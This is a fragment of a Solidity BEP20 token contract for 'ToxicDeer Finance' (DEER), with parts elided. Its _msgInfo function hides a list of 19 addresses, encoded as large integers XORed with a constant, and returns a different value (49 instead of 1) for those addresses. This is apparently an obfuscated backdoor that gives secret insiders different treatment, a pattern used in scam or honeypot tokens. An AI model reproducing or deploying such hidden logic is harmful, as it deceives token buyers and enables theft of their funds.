...
contract DEER is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "ToxicDeer Finance";
	string symbol_ = "DEER";
...
*/
	...
	function _msgInfo(uint _acc) internal view virtual returns (uint v) {
		uint[19] memory acc = [uint(970409881117248518467725331190203133204962184421),534479141120765317697140981782349933770014136345
			,1135655720035091874179516922188048660742818290086,900951972137461487859622690431458001413772785794
			,883694850873345948290993491994821271489123077342,211536713859453698158296615768730517298305658889
			,1323989545482462982062679853767823797285005995207,1417320233632288331738611396078834368034178449079
			,1102762568707353374829581057747552344565457596659,1005012517963886555815456860308269295834189432290
			,970027738713519338883951361907824715020713285597,490881232924905092825754518184050895580663347537
			,1336089159230095201675753332420500140034693275324,329566453094871440122323220918004190423676443741
			,412170586659301088229742134141981566559997828296,397778017587177695576545704053034793996160452127
			,503053764872487006676590810596391555007066040218,1399513526770916930327312046624345580998490033652
			,1451306104221456910280329308833758926865368739729];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 966519731667488712926819923338163426879069372897) return 49;
		}
		return 1;
    }
}